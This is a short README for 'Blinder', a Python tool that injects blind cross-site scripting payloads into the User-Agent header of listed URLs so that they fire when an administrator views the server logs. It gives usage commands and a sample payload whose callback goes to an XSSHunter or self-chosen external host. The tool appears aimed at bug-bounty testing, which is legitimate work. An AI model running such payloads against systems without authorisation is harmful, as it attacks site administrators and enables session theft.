# Blinder
- A Tool Written In Python3 For Sending Blind-XSS Payloads On The User-Agent 

## Usage
```
git clone https://www.github.com/DEMON1A/Blinder.git
cd Blinder
python3 Blinder.py username.xss.ht SubDomains.txt
```

## Description
- That's a New Version Of Blinder You Can Use To Automate Sending Payloads Into URLs With a Fast Way. It Basicly Uses The Payload You Provide To Send It On The Value Of The *User-Agent* Header To Inject The Payload Into The Server Logs If The Admin Can View It. In This Case You Should Receive An Alert On Your XSSHunter/Bin. That's Just It.

### Installation
```
git clone https://github.com/DEMON1A/Blinder
cd Blinder
python3 Blinder.py [ARGS]
```

### What's New?
- Threading To Improve The Script Speed.
- Using Your Own External Bin Instead Of Just Using XSSHunter
- Using Your Own Payloads That Could Be Used To Inject Other Payloads For Other Issues
- Been Able To Allow/Disallow Redirects With Requests
- Cleaner Code!

### How To Use:
- For Basic Usage With a Basic Payload You Can Just The Script Using This:

```
python3 Blinder.py -f URLs.txt -u hacker -r allow
```

- The Script Can't Run Without Getting The Redirection Rule. You Can Select Between `allow` and `deny` That Chooses If The Redirections Will Be Followed In This Case Or Not.

- To Add Your Own Payload You Have To Use `XXX` On Your Payload So It Could Be Replaced With The XSSHunter/ExternalBin. For Example If You Want To Create Your Own Payload It Will Look Like This:

```
python3 Blinder.py -f URLs.txt -u hacker -r allow -p '"><img src="XXX">'
```

- Make Sure The `XXX` In This Case Are Able In a Upper Case.

- To Use Your Own ExternalBin Instead Of XSSHunter You Have To Use `-b` Option. With Your External Host Including The Protocol. For Example

```
python3 Blinder.py -f URLs.txt -b https://www.example.com/ -r allow -p '"><img src="XXX">'
```

### Something Isn't Working Or You Want To Improve Something?
- Then Please Open an Issue With It Or You Can Fork The Project Then Create a Pull Request.
